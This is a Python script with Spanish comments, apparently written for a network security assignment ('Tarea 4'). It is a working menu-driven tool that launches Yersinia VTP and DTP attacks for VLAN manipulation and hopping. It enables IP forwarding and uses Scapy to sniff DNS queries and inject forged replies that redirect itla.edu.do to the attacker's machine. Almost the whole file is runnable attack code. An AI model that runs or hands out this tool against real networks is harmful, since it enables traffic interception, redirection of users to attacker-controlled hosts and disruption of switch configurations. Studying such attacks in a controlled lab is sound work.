import os
import sys
import netifaces
from scapy.all import *

# 1. OBTENCIÓN AUTOMÁTICA DE PARÁMETROS DE RED
def get_network_details():
    try:
        # Obtiene el gateway y la interfaz por defecto automáticamente
        gws = netifaces.gateways()
        interface = gws['default'][netifaces.AF_INET][1]
        gateway = gws['default'][netifaces.AF_INET][0]
        
        # Obtiene la IP local de la interfaz detectada
        ip_addr = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        
        print(f"\n[+] Configuración detectada automáticamente:")
        print(f"    - Interfaz: {interface}")
        print(f"    - IP Kali:  {ip_addr}")
        print(f"    - Gateway:  {gateway}")
        return interface, ip_addr, gateway
    except Exception as e:
        print(f"[-] Error en detección automática: {e}")
        sys.exit(1)

# 2. LÓGICA DE DNS SPOOFING (CAPA 7)
def dns_poisoning(pkt, target_domain, fake_ip, interface):
    # Filtra solo consultas DNS (DNSQR) para el dominio específico
    if pkt.haslayer(DNSQR) and target_domain in pkt[DNSQR].qname.decode():
        try:
            # Construye el paquete de respuesta DNS (DNSRR)
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip))
            
            # Inyecta el paquete en la red
            send(spoofed_pkt, verbose=0, iface=interface)
            print(f"[!] DNS Spoofed: {target_domain} -> {fake_ip}")
        except Exception as e:
            print(f"[-] Error al inyectar paquete DNS: {e}")

# 3. MENÚ PRINCIPAL DE AUDITORÍA
def main():
    if os.getuid() != 0:
        print("[-] Error: El script debe ejecutarse con sudo.")
        sys.exit(1)

    # Inicialización automática
    iface, local_ip, gw_ip = get_network_details()
    
    # Habilitar IP Forwarding en Kali
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    while True:
        print("\n" + "="*40)
        print("   ATAQUES LAYER 2 & 7 - TAREA 4")
        print("="*40)
        print(f"[*] Interfaz activa: {iface}")
        print("1. VTP Attack (Agregar/Borrar VLAN)")
        print("2. DTP VLAN Hopping (Trunk Negotiation)")
        print("3. DNS Spoofing (itla.edu.do)")
        print("4. Salir")
        
        opcion = input("\nSeleccione una opción: ")

        if opcion == "1":
            print("[*] Lanzando VTP Attack mediante Yersinia...")
            # Ataque VTP para saturar/modificar base de datos
            os.system(f"yersinia vtp -attack 1 -i {iface}")
            print("[+] Verifique en el Switch con: show vlan brief")
        
        elif opcion == "2":
            print(f"[*] Lanzando DTP Attack en {iface}...")
            # Convierte puerto de acceso en trunk
            os.system(f"yersinia dtp -attack 1 -i {iface}")
            print("[+] Verifique con: show interfaces switchport | include Mode")
            
        elif opcion == "3":
            domain = "itla.edu.do"
            print(f"[*] Escuchando consultas para {domain}...")
            print("[*] Presiona Ctrl+C para detener el ataque.")
            try:
                # Sniffing enfocado en puerto 53 UDP (DNS)
                sniff(filter="udp port 53", iface=iface, 
                      prn=lambda p: dns_poisoning(p, domain, local_ip, iface))
            except KeyboardInterrupt:
                print("\n[*] DNS Spoofing detenido.")
        
        elif opcion == "4":
            print("[*] Restaurando configuraciones y saliendo...")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            break
        else:
            print("[-] Opción no válida.")

if __name__ == "__main__":
    main()